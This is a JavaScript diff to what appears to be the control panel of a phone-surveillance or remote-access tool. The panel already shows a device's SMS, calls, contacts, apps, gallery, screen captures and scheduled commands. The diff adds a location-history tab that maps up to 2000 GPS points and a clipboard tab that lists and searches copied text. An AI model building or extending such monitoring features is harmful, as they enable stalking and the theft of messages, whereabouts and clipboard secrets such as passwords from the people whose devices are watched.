@@ -890,6 +890,13 @@ let galleryCurrentPage = 1;
 let galleryLightboxIdx = 0;
 let galleryFilteredPhotos = [];
 
+// Location state
+let allLocationPoints = [];
+
+// Clipboard state
+let allClipboardEntries = [];
+let clipboardCurrentPage = 1;
+
 // Screen Capture state
 let allScreenCaptures = [];
 let screenCaptureCurrentPage = 1;
@@ -910,6 +917,9 @@ async function openDeviceModal(deviceId, deviceName) {
   allContacts = [];
   contactsCurrentPage = 1;
   allApps = [];
+  allLocationPoints = [];
+  allClipboardEntries = [];
+  clipboardCurrentPage = 1;
 
   document.getElementById('deviceModalTitle').textContent = deviceName;
   document.getElementById('deviceModalSub').textContent = 'Loading...';
@@ -937,11 +947,16 @@ async function openDeviceModal(deviceId, deviceName) {
   document.getElementById('contactsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading contacts...</span></div>`;
   document.getElementById('appsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading apps...</span></div>`;
   document.getElementById('galleryGridContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading gallery...</span></div>`;
+  document.getElementById('locationListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading location history...</span></div>`;
+  document.getElementById('clipboardListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading clipboard...</span></div>`;
   document.getElementById('smsPagination').innerHTML = '';
   document.getElementById('callsPagination').innerHTML = '';
   document.getElementById('contactsPagination').innerHTML = '';
   document.getElementById('galleryPagination').innerHTML = '';
+  document.getElementById('clipboardPagination').innerHTML = '';
   document.getElementById('galleryCount').textContent = '';
+  document.getElementById('locationCount').textContent = '';
+  document.getElementById('clipboardCount').textContent = '';
 
   // Reset scheduled commands
   allScheduledCommands = [];
@@ -965,6 +980,8 @@ function closeDeviceModal() {
   allApps = [];
   allGalleryPhotos = [];
   galleryFilteredPhotos = [];
+  allLocationPoints = [];
+  allClipboardEntries = [];
   allScreenCaptures = [];
   allScheduledCommands = [];
 }
@@ -983,6 +1000,8 @@ function switchDeviceTab(tab) {
   if (tab === 'contacts' && allContacts.length === 0) loadContacts(1);
   if (tab === 'apps' && allApps.length === 0) loadApps();
   if (tab === 'gallery' && allGalleryPhotos.length === 0) loadGallery(1);
+  if (tab === 'location' && allLocationPoints.length === 0) loadLocationHistory();
+  if (tab === 'clipboard' && allClipboardEntries.length === 0) loadClipboard(1);
   if (tab === 'screen' && allScreenCaptures.length === 0) loadScreenCaptures(1);
   if (tab === 'schedule' && allScheduledCommands.length === 0) loadScheduledCommands();
 }
@@ -1523,6 +1542,126 @@ function renderScreenCapturePagination(currentPage, totalPages, total) {
   if (currentPage < totalPages) html += `<button onclick="loadScreenCaptures(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
   el.innerHTML = html;
 }
+
+// ========== Location History ==========
+async function loadLocationHistory() {
+  try {
+    const hours = document.getElementById('locationHours')?.value || 24;
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/location-history?hours=${hours}&limit=2000`, {
+      headers: { 'x-admin-password': adminPassword },
+    });
+    const data = await res.json();
+    allLocationPoints = data.points || [];
+    const total = data.total || 0;
+
+    document.getElementById('locationCount').textContent = `${total} points`;
+    renderLocationHistory(allLocationPoints);
+  } catch (err) {
+    document.getElementById('locationListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD LOCATION</p></div>`;
+  }
+}
+window.loadLocationHistory = loadLocationHistory;
+
+function renderLocationHistory(points) {
+  const container = document.getElementById('locationListContainer');
+  if (!points || points.length === 0) {
+    container.innerHTML = `<div class="tab-empty"><i class="ri-map-pin-line"></i><p>NO LOCATION DATA</p></div>`;
+    return;
+  }
+
+  container.innerHTML = points.map(p => {
+    const lat = (p.latitude || 0).toFixed(6);
+    const lng = (p.longitude || 0).toFixed(6);
+    const acc = p.accuracy >= 0 ? `${Math.round(p.accuracy)}m` : '?';
+    const src = esc(p.source || 'gps');
+    const dateStr = p.recorded_at ? new Date(p.recorded_at).toLocaleString() : '?';
+    const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+
+    return `
+    <div class="sms-item" style="cursor:pointer" onclick="window.open('${mapsUrl}','_blank')">
+      <div class="sms-avatar" style="background:var(--fx-teal)"><i class="ri-map-pin-line" style="font-size:16px"></i></div>
+      <div class="sms-content">
+        <div class="sms-top-row">
+          <span class="sms-address">${lat}, ${lng}</span>
+          <span class="sms-direction">${src.toUpperCase()}</span>
+        </div>
+        <div class="sms-body" style="font-size:12px">Accuracy: ${acc} · <span style="color:var(--fx-blue)">Open in Maps ↗</span></div>
+        <div class="sms-date">${dateStr}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ========== Clipboard ==========
+async function loadClipboard(page) {
+  try {
+    clipboardCurrentPage = page;
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/clipboard?page=${page}&limit=50`, {
+      headers: { 'x-admin-password': adminPassword },
+    });
+    const data = await res.json();
+    allClipboardEntries = data.entries || [];
+    const total = data.total || 0;
+    const totalPages = data.totalPages || 1;
+
+    document.getElementById('clipboardCount').textContent = `${total} entries`;
+    renderClipboard(allClipboardEntries);
+    renderClipboardPagination(page, totalPages, total);
+  } catch (err) {
+    document.getElementById('clipboardListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD CLIPBOARD</p></div>`;
+  }
+}
+window.loadClipboard = loadClipboard;
+
+function renderClipboard(entries) {
+  const container = document.getElementById('clipboardListContainer');
+  if (!entries || entries.length === 0) {
+    container.innerHTML = `<div class="tab-empty"><i class="ri-clipboard-line"></i><p>NO CLIPBOARD DATA</p></div>`;
+    return;
+  }
+
+  container.innerHTML = entries.map(e => {
+    const text = esc(e.text || '(empty)');
+    const dateStr = e.clip_timestamp ? new Date(e.clip_timestamp).toLocaleString() : (e.synced_at || '?');
+    const preview = text.length > 100 ? text.substring(0, 100) + '...' : text;
+    const avatar = '📋';
+
+    return `
+    <div class="sms-item">
+      <div class="sms-avatar">${avatar}</div>
+      <div class="sms-content">
+        <div class="sms-top-row">
+          <span class="sms-address">Clipboard</span>
+          <span class="sms-direction">${text.length} chars</span>
+        </div>
+        <div class="sms-body">${preview}</div>
+        <div class="sms-date">${dateStr}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function renderClipboardPagination(currentPage, totalPages, total) {
+  const container = document.getElementById('clipboardPagination');
+  if (totalPages <= 1) { container.innerHTML = ''; return; }
+  let html = '';
+  if (currentPage > 1) html += `<button onclick="loadClipboard(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
+  const s = Math.max(1, currentPage - 2), e = Math.min(totalPages, currentPage + 2);
+  for (let i = s; i <= e; i++) html += `<button class="${i===currentPage?'active':''}" onclick="loadClipboard(${i})">${i}</button>`;
+  if (currentPage < totalPages) html += `<button onclick="loadClipboard(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
+  container.innerHTML = html;
+}
+
+function filterClipboard() {
+  const search = (document.getElementById('clipboardSearch')?.value || '').toLowerCase();
+  if (!search) {
+    renderClipboard(allClipboardEntries);
+    return;
+  }
+  const filtered = allClipboardEntries.filter(e => (e.text || '').toLowerCase().includes(search));
+  renderClipboard(filtered);
+}
+window.filterClipboard = filterClipboard;
 
 function requestScreenCapture() {
   if (!modalDeviceId) return;
